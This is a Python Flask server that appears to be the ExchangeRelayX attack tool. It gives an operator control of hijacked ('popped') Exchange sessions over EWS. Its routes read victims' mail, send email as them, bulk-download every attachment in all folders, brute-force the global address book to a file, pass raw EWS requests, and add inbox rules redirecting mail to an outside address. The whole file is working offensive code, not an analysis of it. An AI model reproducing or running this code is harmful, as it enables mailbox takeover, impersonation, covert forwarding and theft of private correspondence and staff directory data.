#!/usr/bin/python
from flask import Flask, request, abort, jsonify
import EWSOps
import logging
import json
import base64
import xml.dom.minidom
from threading import currentThread
import os

class EWSXMLException(Exception):
	def __str__(self):
		return "EWS API to XML exception - did the web server respond with HTML?"
	pass

def authRequests_POST(username, data = None):
	global poppedDB_Lock
	global poppedDB
	username = username.encode("utf-8")
	try:
		encoded = base64.b64encode(data)
		if(len(encoded) == 0):
			logging.error("POST request made with no data provided!")
			return
		# Keep checking in to see if the thread replied
		while True:
			if(poppedDB[username]['b64_request'] != ''):
				logging.info("Still waiting for slot: " + str(currentThread()))
				continue
			poppedDB_Lock.acquire()
			poppedDB[username] = {'b64_request' : encoded, 'b64_response' : '', 'thread_id' : str(currentThread())}
			poppedDB_Lock.release()
			break
		while True:
			if(poppedDB[username]['b64_response'] != "" and poppedDB[username]['thread_id'] == str(currentThread())):
				poppedDB_Lock.acquire()
				data = base64.b64decode(poppedDB[username]['b64_response'])
				poppedDB[username] = {'b64_request' : '', 'b64_response' : '', 'thread_id' : ''}
				poppedDB_Lock.release()
				decoded = data.decode('utf-8', errors='ignore').strip()
				uniStrip = ''.join([i if ord(i) < 128 else '' for i in decoded])
				return uniStrip
			# logging.info("Awaiting response from server...(" + str(poppedDB.keys()))
	except Exception, e:
		if(username in poppedDB.keys()):
			poppedDB_Lock.acquire()
			del(poppedDB[username])
			poppedDB_Lock.release()
		if(poppedDB_Lock.locked()):
			poppedDB_Lock.release()

# returns a list of [{"FolderID", "ChangeKey", "Name", "SubFolders" : []}]
def listSubFoldersInCustom(folderId, changeKey, username):
	offset 			= 0
	done 			= False
	subFolders 		= []

	while not done:
		try:
			data 			= authRequests_POST(data = EWSOps.findSubFoldersOfCustom(folderId, changeKey, 250, int(offset), 'Beginning'), username = username)
			data 			= xml.dom.minidom.parseString(data)
		except Exception, e:
			logging.error("[owaServer::listSubFoldersInCustom] " + str(e))
			raise EWSXMLException
		for folder in data.getElementsByTagName('t:Folder'):
			tmp 				= dict()
			tmp['FolderId']		= folder.getElementsByTagName('t:FolderId')[0].getAttribute('Id')
			tmp['ChangeKey'] 	= folder.getElementsByTagName('t:FolderId')[0].getAttribute('ChangeKey')
			tmp['Name'] 		= str(folder.getElementsByTagName('t:DisplayName')[0].firstChild.nodeValue)
			subFolders.append(tmp)
			del(tmp)

		# logging.info(data.toprettyxml())
		# Keep reading this list of subfolders to the end
		if(data.getElementsByTagName('m:RootFolder')[0].getAttribute('IncludesLastItemInRange') == "true"):
			done = True
			break
		else:
			del(data)
			offset += 250
	# For every one of the subfolders identified, repeat this process
	for x in subFolders:
		x['SubFolders'] = []
		x['SubFolders'] = listSubFoldersInCustom(x['FolderId'], x['ChangeKey'], username)

	return subFolders

# returns a list of [{"FolderID", "ChangeKey", "Name"}]
def listSubFoldersInDistinguished(distinguishedId, username):
	offset 			= 0
	done 			= False
	subFolders 		= []

	while not done:
		try:
			data 			= authRequests_POST(data = EWSOps.findSubFoldersOfDistinguished(distinguishedId, 250, int(offset), 'Beginning'), username = username)
			data 			= xml.dom.minidom.parseString(data)
		except Exception, e:
			logging.error("[owaServer::listSubFoldersInDistinguished] " + str(e))
			logging.error(data)
			raise EWSXMLException
		for folder in data.getElementsByTagName('t:Folder'):
			tmp 				= dict()
			tmp['FolderId']		= folder.getElementsByTagName('t:FolderId')[0].getAttribute('Id')
			tmp['ChangeKey'] 	= folder.getElementsByTagName('t:FolderId')[0].getAttribute('ChangeKey')
			tmp['Name'] 		= str(folder.getElementsByTagName('t:DisplayName')[0].firstChild.nodeValue)
			subFolders.append(tmp)
			del(tmp)
		# Keep reading this list of subfolders to the end
		if(data.getElementsByTagName('m:RootFolder')[0].getAttribute('IncludesLastItemInRange') == "true"):
			done = True
			break
		else:
			del(data)
			offset += 250

	return subFolders

# 
def runServer(serverIP, serverPort, poppedDB, poppedDB_Lock):
	app = Flask(__name__, static_folder='static')

	globals()['poppedDB'] 		= poppedDB
	globals()['poppedDB_Lock']	= poppedDB_Lock

	# Index/root
	@app.route('/')
	def indexHandler1():
		return open('lib/static/index.html').read()
	@app.route('/index.html')
	def indexHandler2():
		return open('lib/static/index.html').read()
	# Serve up the static js/css/html files
	@app.route('/static/<path:path>', methods = ["GET"])
	def staticFiles(path):
		return app.send_from_directory(path)
	# Show what sessions we've popped
	@app.route('/listSessions', methods = ["GET"])
	def listSessions():
		userList = []
		while poppedDB_Lock.locked():
			# wait for it to be unlocked
			pass
		for user in poppedDB.keys():
			userList.append(user)

		# If it's blank
		if userList == []:
			return jsonify({}), 200
		else:
			return jsonify({"Users" : userList}), 200

	# Compose email window
	@app.route('/EWStoOWA/<username>/composeEmail', methods = ['GET'])
	def composeEmail(username):
		username = username.replace("%", "/")
		return open('lib/static/ComposeEmail.html').read()
	
	# Load the OWA page
	@app.route('/EWStoOWA/<username>/', methods = ["GET"])
	def loadOWA(username):
		username = username.replace("%", "/")
		return open('lib/static/OWA.html').read()

	# List subfolders
	@app.route('/EWStoOWA/<username>/expandAllSubFolders', methods = ['GET'])
	def expandSubFolders(username):
		username = username.replace("%", "/")
		treeMap = dict()
		try:
			for known in EWSOps.DistinguishedFolders:
				parentSubs 		= listSubFoldersInDistinguished(known, username)
				for x in range(0, len(parentSubs)):
					parentSubs[x]['SubFolders'] = listSubFoldersInCustom(parentSubs[x]['FolderId'], parentSubs[x]['ChangeKey'], username)
				treeMap[known] = parentSubs
			return jsonify(treeMap), 200
		except EWSXMLException:
			return jsonify({}), 500
	
	# List the emails in a distinguished folder
	@app.route('/EWStoOWA/<username>/listEmails_Distinguished', methods = ['POST'])
	def listEmailsDistinguished(username):
		username 	= username.replace("%", "/")
		content 	= request.get_json()


		folder 		= content['folder']
		max_items 	= content['max']
		offset 		= content['offset']
		startpoint	= content['startpoint']

		# Get a list of the emails
		data = None
		try:
			data = authRequests_POST(data = EWSOps.findItemsDistinguishedId(folder, int(max_items), int(offset), startpoint), username = username)
			data = xml.dom.minidom.parseString(data)
		except Exception, e:
			logging.error(e)
			return jsonify({}), 500

		# Build the short-list
		info = []
		for message in data.getElementsByTagName('t:Message'):
			tmp 				= dict()
			tmp['ItemId'] 		= message.getElementsByTagName('t:ItemId')[0].getAttribute('Id')
			tmp['ChangeKey'] 	= message.getElementsByTagName('t:ItemId')[0].getAttribute('ChangeKey')
			if(message.getElementsByTagName('t:Subject')[0].firstChild != None):
				tmp['Subject'] 	= str(message.getElementsByTagName('t:Subject')[0].firstChild.nodeValue)
			else:
				tmp['Subject']	= ""
			tmp['Date'] 		= str(message.getElementsByTagName('t:DateTimeReceived')[0].firstChild.nodeValue)
			if(message.getElementsByTagName('t:DisplayTo')[0].firstChild != None):
				tmp['Recipient']	= str(message.getElementsByTagName('t:DisplayTo')[0].firstChild.nodeValue)
			else:
				tmp['Recipient']	= "(None)"
			tmp['Importance']	= str(message.getElementsByTagName('t:Importance')[0].firstChild.nodeValue)
			tmp['Attachment']	= str(message.getElementsByTagName('t:HasAttachments')[0].firstChild.nodeValue)
			tmp['IsRead']		= str(message.getElementsByTagName('t:IsRead')[0].firstChild.nodeValue) # true or false
			tmp['Sender']		= str(message.getElementsByTagName('t:Sender')[0].getElementsByTagName('t:Mailbox')[0].getElementsByTagName('t:Name')[0].firstChild.nodeValue)
			tmp['Copied'] 		= ""
			if(message.getElementsByTagName('t:DisplayCc')[0].firstChild != None):
				tmp['Copied'] 		= message.getElementsByTagName('t:DisplayCc')[0].firstChild.nodeValue
			info.append(tmp)
			del(tmp)

		return jsonify(info), 200

	# List the emails in a custom folder id
	@app.route('/EWStoOWA/<username>/listEmails_FolderId', methods = ['POST'])
	def listEmailsFolderId(username):
		username 	= username.replace("%", "/")
		content 	= request.get_json()

		folderId	= content['folderId']
		changeKey 	= content['changeKey']
		max_items 	= content['max']
		offset 		= content['offset']
		startpoint	= content['startpoint']

		# Get a list of the emails
		data = None
		try:
			data = authRequests_POST(data = EWSOps.findItemsFolderId(folderId, changeKey, int(max_items), int(offset), startpoint), username = username)
			data = xml.dom.minidom.parseString(data)
		except Exception, e:
			logging.error(e)
			return jsonify({}), 500

		# Build the short-list
		info = []
		for message in data.getElementsByTagName('t:Message'):
			tmp 				= dict()
			tmp['ItemId'] 		= message.getElementsByTagName('t:ItemId')[0].getAttribute('Id')
			tmp['ChangeKey'] 	= message.getElementsByTagName('t:ItemId')[0].getAttribute('ChangeKey')
			if(message.getElementsByTagName('t:Subject')[0].firstChild != None):
				tmp['Subject'] 		= str(message.getElementsByTagName('t:Subject')[0].firstChild.nodeValue)
			else:
				tmp['Subject']	= ""
			tmp['Date'] 		= str(message.getElementsByTagName('t:DateTimeReceived')[0].firstChild.nodeValue)
			tmp['Recipient']	= str(message.getElementsByTagName('t:DisplayTo')[0].firstChild.nodeValue)
			tmp['Importance']	= str(message.getElementsByTagName('t:Importance')[0].firstChild.nodeValue)
			tmp['Attachment']	= str(message.getElementsByTagName('t:HasAttachments')[0].firstChild.nodeValue)
			tmp['IsRead']		= str(message.getElementsByTagName('t:IsRead')[0].firstChild.nodeValue) # true or false
			tmp['Sender'] 		= str(message.getElementsByTagName('t:Sender')[0].getElementsByTagName('t:Mailbox')[0].getElementsByTagName('t:Name')[0].firstChild.nodeValue)
			tmp['Copied'] 		= ""
			if(message.getElementsByTagName('t:DisplayCc')[0].firstChild != None):
				tmp['Copied'] 		= message.getElementsByTagName('t:DisplayCc')[0].firstChild.nodeValue
			info.append(tmp)
			del(tmp)

		return jsonify(info), 200

	# returns the content of an email, provided by the ItemId and ChangeKey
	@app.route('/EWStoOWA/<username>/getEmail', methods = ['POST'])
	def getEmail(username):
		username 	= username.replace("%", "/")
		content 	= request.get_json()
		ItemId 		= content['ItemId']
		ChangeKey 	= content['ChangeKey']
		itemMap 	= [{"ItemId" : ItemId, "ChangeKey" : ChangeKey}]

		# Get a list of the emails
		data = authRequests_POST(data = EWSOps.getItems(itemMap), username = username)
		try:
			data = xml.dom.minidom.parseString(data)
		except Exception, e:
			logging.info("ERROR: " + str(data) + "\n" + str(e))
			return jsonify({}), 500

		response 	= {}
		response['recipients'] = []	
		if(len(data.getElementsByTagName('t:Message')[0].getElementsByTagName('t:ToRecipients')) > 0):
			for item in data.getElementsByTagName('t:Message')[0].getElementsByTagName('t:ToRecipients')[0].getElementsByTagName('t:Mailbox'):
				name 	= ""
				name 	+= item.getElementsByTagName('t:Name')[0].firstChild.nodeValue
				name 	+= " &lt;" + item.getElementsByTagName('t:EmailAddress')[0].firstChild.nodeValue + "&gt;"
				response['recipients'].append(name)

		response['copied'] = []

		if(len(data.getElementsByTagName('t:Message')[0].getElementsByTagName('t:CcRecipients')) > 0):
			for item in data.getElementsByTagName('t:Message')[0].getElementsByTagName('t:CcRecipients')[0].getElementsByTagName('t:Mailbox'):
				name 	= ""
				name 	+= item.getElementsByTagName('t:Name')[0].firstChild.nodeValue
				name 	+= " &lt;" + item.getElementsByTagName('t:EmailAddress')[0].firstChild.nodeValue + "&gt;"
				response['copied'].append(name)

		response['senders'] = []
		if(len(data.getElementsByTagName('t:Message')[0].getElementsByTagName('t:From')) > 0):
			for item in data.getElementsByTagName('t:Message')[0].getElementsByTagName('t:From')[0].getElementsByTagName('t:Mailbox'):
				name 	= ""
				name 	+= item.getElementsByTagName('t:Name')[0].firstChild.nodeValue
				name 	+= " &lt;" + item.getElementsByTagName('t:EmailAddress')[0].firstChild.nodeValue + "&gt;"
				response['senders'].append(name)
		
		response['date'] = "DateNotFound"
		if(len(data.getElementsByTagName('t:Message')[0].getElementsByTagName('t:DateTimeReceived')) > 0):
			response['date'] = data.getElementsByTagName('t:Message')[0].getElementsByTagName('t:DateTimeReceived')[0].firstChild.nodeValue
		else:
			if(len(data.getElementsByTagName('t:Message')[0].getElementsByTagName('t:DateTimeSent')) > 0):
				response['date'] = data.getElementsByTagName('t:Message')[0].getElementsByTagName('t:DateTimeSent')[0].firstChild.nodeValue

		response['subject']		= '(None)'
		if(data.getElementsByTagName('t:Message')[0].getElementsByTagName('t:Subject')[0].firstChild != None):
			response['subject'] = str(data.getElementsByTagName('t:Message')[0].getElementsByTagName('t:Subject')[0].firstChild.nodeValue)
		
		response['attachments'] = []
		for item in data.getElementsByTagName('t:Message')[0].getElementsByTagName('t:FileAttachment'):
			name 	= item.getElementsByTagName('t:Name')[0].firstChild.nodeValue
			ID 		= item.getElementsByTagName('t:AttachmentId')[0].getAttribute('Id')
			Bytes 	= item.getElementsByTagName('t:Size')[0].firstChild.nodeValue
			response['attachments'].append({"Name" : name, "Attachment_Id" : ID, "Bytes" : Bytes})

		# Load the body of the email
		response['content'] = data.getElementsByTagName('t:Message')[0]
		response['content'] = response['content'].getElementsByTagName('t:Body')[0].firstChild.nodeValue


		return jsonify(response), 200

	# Sends an email (possibly with an attachment)
	@app.route('/EWStoOWA/<username>/sendEmail', methods = ['POST'])
	def sendEmail(username):
		username 	= username.replace("%", "/")
		content 	= request.get_json()

		# logging.info(content)

		to_list 	= content['to_recipients'].split(";")
		cc_list 	= content['cc_recipients'].split(";")
		bcc_list 	= content['bcc_recipients'].split(";")

		if u'' in to_list:
			to_list.remove(u'')
		if u'' in cc_list:
			cc_list.remove(u'')
		if u'' in bcc_list:
			bcc_list.remove(u'')

		attachment 	= content['attachment']
		subject 	= content['subject']
		body 		= content['body']

		# logging.info(to_list)
		# logging.info(cc_list)
		# logging.info(bcc_list)
		# logging.info(subject)
		# logging.info(body)
		# logging.info(attachment)

		# Send the email
		# 	If there's an attachment
		if(attachment != '' and attachment != None):
			logging.info("Value of attachment: '" + attachment + "'")
			attachmentName 				= attachment[attachment.rfind("/", 0)+1:]
			attachmentNameb64Content 	= base64.b64encode(open(attachment).read())
			# b64 the file contents and send it
			data = authRequests_POST(data = EWSOps.sendEmail_SecretAttachment(to_list, cc_list, bcc_list, subject, body, attachmentName, attachmentNameb64Content), username = username)
		# 	If not
		else:
			# Just send an email without any attachments
			data = authRequests_POST(data = EWSOps.sendEmail_Secret(to_list, cc_list, bcc_list, subject, body), username = username)
		

		try:
			data = xml.dom.minidom.parseString(data)
		except Exception, e:
			logging.info("ERROR: " + str(data) + "\n" + str(e))
			return jsonify({}), 501

		return jsonify({"result" : "success"}), 200
		
	# Downloads an attachment to the provided output directory
	@app.route('/EWStoOWA/<username>/downloadAttachment', methods = ['POST'])
	def downloadAttachment(username):
		username 		= username.replace("%", "/")
		content 		= request.get_json()
		outfolder 		= content['outputFolder']
		attachmentID 	= content['attachmentID']
		if(not os.path.isdir(outfolder) or not os.access(outfolder, os.W_OK)):
			return jsonify({"data" : "<ExchangeRelayX - Invalid directory specified!>"}), 500
		if outfolder[-1] == "/":
			outfolder = outfolder[:-1]

		data = None
		try:
			data 	= authRequests_POST(data = EWSOps.downloadEmailAttachment(attachmentID), username = username)
			data 	= xml.dom.minidom.parseString(data)
		except Exception, e:
			logging.info("downloadAttachment Error: " + str(data) + "\n" + str(e))
			return jsonify({}), 501

		for file in data.getElementsByTagName('t:FileAttachment'):
			originalname = file.getElementsByTagName('t:Name')[0].firstChild.nodeValue
			content 	= file.getElementsByTagName('t:Content')[0].firstChild.nodeValue
			name 		= originalname
			tracker 	= 0
			while os.path.isfile(outfolder + "/" + name):
				name 	= originalname + "_" + str(tracker)
				tracker += 1

			logging.info("Writing " + outfolder + "/" + name + ".......")
			newFile = open(outfolder + "/" + name, "w+")
			newFile.write(base64.b64decode(content))
			newFile.close()
			del(newFile)

		return jsonify({"data" : "Data written out to " + outfolder + "/" + name}), 200

	# Download all attachments
	@app.route('/EWStoOWA/<username>/downloadAllAttachments', methods = ['POST'])
	def downloadAllAttachments(username):
		username 		= username.replace("%", "/")
		content 		= request.get_json()
		outfolder 		= content['outputFolder']

		if(not os.path.isdir(outfolder) or not os.access(outfolder, os.W_OK)):
			return jsonify({"data" : "<ExchangeRelayX - Invalid directory specified!>"}), 500
		if outfolder[-1] == "/":
			outfolder = outfolder[:-1]

		# Get a list of all ssubfolders of the folders & sub folders
		treeMap 			= dict() 
		for known in EWSOps.DistinguishedFolders:
			logging.info("(" + username + ") Expanding " + known + ".....")
			parentSubs 		= listSubFoldersInDistinguished(known, username)
			for x in range(0, len(parentSubs)):
				parentSubs[x]['SubFolders'] = listSubFoldersInCustom(parentSubs[x]['FolderId'], parentSubs[x]['ChangeKey'], username)
			treeMap[known] = parentSubs

		def recurse(dictionary):
			subs = []
			for key,value in dictionary.iteritems():
				for item in value:
					subs.append({"FolderId" : str(item['FolderId']), "ChangeKey" : str(item['ChangeKey']), "Name" : str(item['Name'])})
					for additional in item['SubFolders']:
						subs += recurse(additional)
			return subs
		subfolders = recurse(treeMap)

		# We now have a list of all folders & subfolders, cool. Now lets hunt for attachments
		logging.info("Expanding complete: " + str(len(subfolders)) + " subfolders found!")

		# We now need to find all emails in each folder & subfolder that have attachments
		try:
			emailTracker = []
			for known in EWSOps.DistinguishedFolders:
				logging.info("(" + username + ") Hunting for emails w/ attachments in " + known + ".....")
				offset		= 0
				startpoint 	= 'Beginning'
				done = False
				while not done:
					data 	= authRequests_POST(data = EWSOps.findAllWithAttachmentsDistinguished(known, 200, int(offset), startpoint), username = username)
					data 	= xml.dom.minidom.parseString(data)
					done 	= (data.getElementsByTagName('m:RootFolder')[0].getAttribute('IncludesLastItemInRange') == "true")
					for email in data.getElementsByTagName('t:Message'):
						itemID 		= email.getElementsByTagName('t:ItemId')[0].getAttribute('Id')
						changeKey 	= email.getElementsByTagName('t:ItemId')[0].getAttribute('ChangeKey')
						emailTracker.append({"ItemId" : itemID, "ChangeKey" : changeKey})
					offset += 200

			# Now hunt in the subfolders
			for sub in  subfolders:
				logging.info("(" + username + ") Hunting for emails w/ attachments in subfolder '" + sub['Name'] + "'.....")
				offset		= 0
				startpoint 	= 'Beginning'
				done = False
				while not done:
					data 	= authRequests_POST(data = EWSOps.findAllWithAttachmentsCustom(sub['FolderId'], sub['ChangeKey'], 200, int(offset), startpoint), username = username)
					data 	= xml.dom.minidom.parseString(data)
					done 	= (data.getElementsByTagName('m:RootFolder')[0].getAttribute('IncludesLastItemInRange') == "true")
					for email in data.getElementsByTagName('t:Message'):
						itemID 		= email.getElementsByTagName('t:ItemId')[0].getAttribute('Id')
						changeKey 	= email.getElementsByTagName('t:ItemId')[0].getAttribute('ChangeKey')
						emailTracker.append({"ItemId" : itemID, "ChangeKey" : changeKey})
					offset += 200
			logging.info("(" + username + ") " + str(len(emailTracker)) + " emails with attachments found!")
			logging.info("(" + username + ") Harvesting to attachment IDs.....")


			def divide_list_chunks(l, n):
				# looping till length l
				for i in range(0, len(l), n): 
					yield l[i:i + n]

			# Do this in 100 email batches for bandwidth reasons
			attachmentIDs 	= []
			masterList 		= list(divide_list_chunks(emailTracker, 100))
			for section in masterList:
				data 	= authRequests_POST(data = EWSOps.getEmailAttachmentIds(section), username = username)
				data 	= xml.dom.minidom.parseString(data)
				for item in data.getElementsByTagName('t:FileAttachment'):
					attachmentIDs.append(item.getElementsByTagName('t:AttachmentId')[0].getAttribute('Id'))
			# Eliminate any duplicates
			attachmentIDs = list(set(attachmentIDs))


			logging.info("(" + username + ") Attachment IDs harvested! Downloading....")
			for attachment in attachmentIDs:
				data 	= authRequests_POST(data = EWSOps.downloadEmailAttachment(attachment), username = username)
				data 	= xml.dom.minidom.parseString(data)
				for file in data.getElementsByTagName('t:FileAttachment'):
					originalname = file.getElementsByTagName('t:Name')[0].firstChild.nodeValue
					content 	= file.getElementsByTagName('t:Content')[0].firstChild.nodeValue
					name 		= originalname
					tracker 	= 0
					while os.path.isfile(outfolder + "/" + name):
						name 	= originalname + "_" + str(tracker)
						tracker += 1
					logging.info("Writing " + outfolder + "/" + name + ".......")
					newFile = open(outfolder + "/" + name, "w+")
					newFile.write(base64.b64decode(content))
					newFile.close()
					del(newFile)

			logging.info("(" + username + ") Successfully downloaded " + str(len(attachmentIDs)) + " attachments!")
			return jsonify({"data" : str(len(attachmentIDs)) + " attachments downloaded to " + outfolder}), 200
		except Exception, e:
			logging.error("downloadAllAttachments: " + str(e))
			return jsonify({}), 500

	# Returns the search data
	@app.route('/EWStoOWA/<username>/searchContacts', methods = ['POST'])
	def searchContacts(username):
		username 		= username.replace("%", "/")
		content 		= request.get_json()
		startsWith 		= content['startsWith']

		data = None
		try:
			data = authRequests_POST(data = EWSOps.searchAddressBook(startsWith), username = username)
			data = xml.dom.minidom.parseString(data)
		except Exception, e:
			logging.error("searchContacts: " + str(e))
			return jsonify({}), 500

		contacts = []
		for message in data.getElementsByTagName('t:Resolution'):
			Mailbox 				= message.getElementsByTagName('t:Mailbox')[0]
			Contact 				= message.getElementsByTagName('t:Contact')[0]
			newContact 				= dict()
			newContact['FullName']		= "&lt;None&gt;"
			newContact['Email']			= "&lt;None&gt;"
			newContact['Department'] 	= "&lt;None&gt;"
			newContact['Title']			= "&lt;None&gt;"

			if(Mailbox.getElementsByTagName('t:Name')[0].firstChild != None):
				newContact['FullName'] 		= Mailbox.getElementsByTagName('t:Name')[0].firstChild.data
			if(Mailbox.getElementsByTagName('t:EmailAddress')[0].firstChild != None):
				newContact['Email'] 			= Mailbox.getElementsByTagName('t:EmailAddress')[0].firstChild.data
			if(Contact.getElementsByTagName('t:Department')[0].firstChild != None):
				newContact['Department'] 		= Contact.getElementsByTagName('t:Department')[0].firstChild.data
			if(Contact.getElementsByTagName('t:JobTitle')[0].firstChild != None):
				newContact['Title'] 			= Contact.getElementsByTagName('t:JobTitle')[0].firstChild.data
			newContact['PhysicalAddress'] 	= []
			for addressInput in message.getElementsByTagName('t:Contact')[0].getElementsByTagName('t:PhysicalAddresses')[0].getElementsByTagName("t:Entry"):
				address 					= dict()
				address['Title'] 			= "&lt;None&gt;"
				address['Street'] 			= "&lt;None&gt;"
				address['City'] 			= "&lt;None&gt;"
				address['State'] 			= "&lt;None&gt;"
				address['CountryOrRegion']  = "&lt;None&gt;"
				address['PostalCode'] 		= "&lt;None&gt;"

				if(addressInput.getAttribute('Key') != None):
					address['Title'] 			= addressInput.getAttribute('Key')
				if(addressInput.getElementsByTagName('t:Street')[0].firstChild != None):
					address['Street'] 			= addressInput.getElementsByTagName('t:City')[0].firstChild.data
				if(addressInput.getElementsByTagName('t:City')[0].firstChild != None):
					address['City'] 			= addressInput.getElementsByTagName('t:City')[0].firstChild.data
				if(addressInput.getElementsByTagName('t:State')[0].firstChild != None):
					address['State'] 			= addressInput.getElementsByTagName('t:State')[0].firstChild.data
				if(addressInput.getElementsByTagName('t:CountryOrRegion')[0].firstChild != None):
					address['CountryOrRegion'] 			= addressInput.getElementsByTagName('t:CountryOrRegion')[0].firstChild.data
				if(addressInput.getElementsByTagName('t:PostalCode')[0].firstChild != None):
					address['PostalCode'] 			= addressInput.getElementsByTagName('t:PostalCode')[0].firstChild.data
				newContact['PhysicalAddress'].append(address)
			newContact['PhoneNumbers'] 	= []
			for number in message.getElementsByTagName('t:Contact')[0].getElementsByTagName('t:PhoneNumbers')[0].getElementsByTagName('t:Entry'):
				num 			= dict()
				num['Name'] 	= "&lt;None&gt;"
				num['Number'] 	= "&lt;None&gt;"

				if(number.getAttribute('Key') != None):
					num['Name'] = number.getAttribute('Key')
				if(number.firstChild != None):
					num['Number'] = number.firstChild.data
				newContact['PhoneNumbers'].append(num)
			contacts.append(newContact)
		
		# Send it
		return jsonify(contacts), 200

	# Brute forces the global address book via the 'ResolveNames' function, saves results to xml file
	@app.route('/EWStoOWA/<username>/downloadAllContacts_Slow', methods = ['POST'])
	def downloadAllContacts_Slow(username):
		username 		= username.replace("%", "/")
		content 		= request.get_json()
		outfolder 		= content['outputFolder']

		if(not os.path.isdir(outfolder) or not os.access(outfolder, os.W_OK)):
			return jsonify({"data" : '<ExchangeRelayX - Invalid directory specified!'}), 500
		if outfolder[-1] == "/":
			outfolder = outfolder[:-1]

		XML_OUT = outfolder + "/ContactListExport.xml"
		tracker = 0
		while os.path.isfile(XML_OUT):
			XML_OUT = outfolder + "/ContactListExport_" + str(tracker) + ".xml"
			tracker += 1

		outfile = open(XML_OUT, "w+")
		logging.info("Exporting contacts to " + XML_OUT)

		# Track what contacts have already been entered by their email addresses 
		# nested function for recursion
		def recursive_contactSearch(seed, username):
			exhausted = False
			# A -> Z
			for outmost in range(65, 91):
				global outfile
				searchString 	= str(seed) + chr(outmost)

				# SMTP returns everything
				if(searchString == "SMT" or searchString == "SMTP"):
					return
				logging.info("Dumping contacts to " + XML_OUT + " [" + searchString + "] (contacts obtained: " + str(len(recursive_contactSearch.tmp_covered)) + ")")
				data 			= authRequests_POST(data = EWSOps.searchAddressBook(searchString), username = username)
				data 			= xml.dom.minidom.parseString(data)

				# Check if there were any results
				if data.getElementsByTagName('m:ResolveNamesResponseMessage')[0].getAttribute('ResponseClass') == "Error":
					continue
				for contact in data.getElementsByTagName('t:Resolution'):
					email = contact.getElementsByTagName('t:Mailbox')[0].getElementsByTagName('t:EmailAddress')[0].firstChild.data
					if(email.lower() in recursive_contactSearch.tmp_covered):
						continue
					else:
						recursive_contactSearch.tmp_covered.append(email.lower())
						# IDK what xml elements change between environments, so let's play it save and save everything
						recursive_contactSearch.tmp_outfile.write(contact.toprettyxml() + "\n")
				exhausted 		= (data.getElementsByTagName('m:ResolutionSet')[0].getAttribute('IncludesLastItemInRange') == "true")
				if not exhausted:
					recursive_contactSearch(searchString, username)		
		recursive_contactSearch.tmp_covered = []
		recursive_contactSearch.tmp_outfile = outfile
		recursive_contactSearch('', username)
		outfile.close()


		logging.info("(" + username + ") Successfully downloaded " + str(len(recursive_contactSearch.tmp_covered)) + " contacts!")
		return jsonify({"data" : str(len(recursive_contactSearch.tmp_covered)) + " contacts downloaded to " + XML_OUT}), 200

	# Send the EWS server raw XML requests
	@app.route('/EWStoOWA/<username>/rawXMLPost', methods = ['POST'])
	def rawXMLPost(username):
		username 		= username.replace("%", "/")
		content 		= request.get_json()
		if(len(content['64xml']) == 0):
			return jsonify({"data" : '<ExchangeRelayX - You didn\'t send any data'}), 500
		rawXML 		= base64.b64decode(content['64xml'])
		# Send the raw XML to the server
		data 		= authRequests_POST(data = rawXML, username = username)
		bdata 		= base64.b64encode(data)
		return jsonify({"data" : bdata}), 200
	
	# Add forward/redirect rules
	@app.route('/EWStoOWA/<username>/addRedirectRule', methods = ['POST'])
	def addRedirectRule(username):
		username 		= username.replace("%", "/")
		content 		= request.get_json()

		displayName 	= content['ruleName']
		targetEmail 	= content['targetEmail']

		# Add a redirect rule
		data = None
		try:
			data = authRequests_POST(data = EWSOps.addRedirectRule(displayName, targetEmail), username = username)
			data = xml.dom.minidom.parseString(data)
		except Exception, e:
			logging.error(e)
			return jsonify({}), 500

		if data.getElementsByTagName('UpdateInboxRulesResponse')[0].getAttribute('ResponseClass') == "Success":
			return jsonify({"data" : "Mail redirect rule '" + displayName + "' added!"})
		else:
			return jsonify({}), 500
		'''
		<?xml version="1.0" encoding="utf-8"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Header><h:ServerVersionInfo MajorVersion="15" MinorVersion="0" MajorBuildNumber="847" MinorBuildNumber="31" Version="V2_8" xmlns:h="http://schemas.microsoft.com/exchange/services/2006/types" xmlns="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/></s:Header><s:Body xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><UpdateInboxRulesResponse ResponseClass="Success" xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"><ResponseCode>NoError</ResponseCode></UpdateInboxRulesResponse></s:Body></s:Envelope>
		'''

	# Del forward/redirect rules

	app.run(debug=False, host = serverIP, port = serverPort, threaded = True)

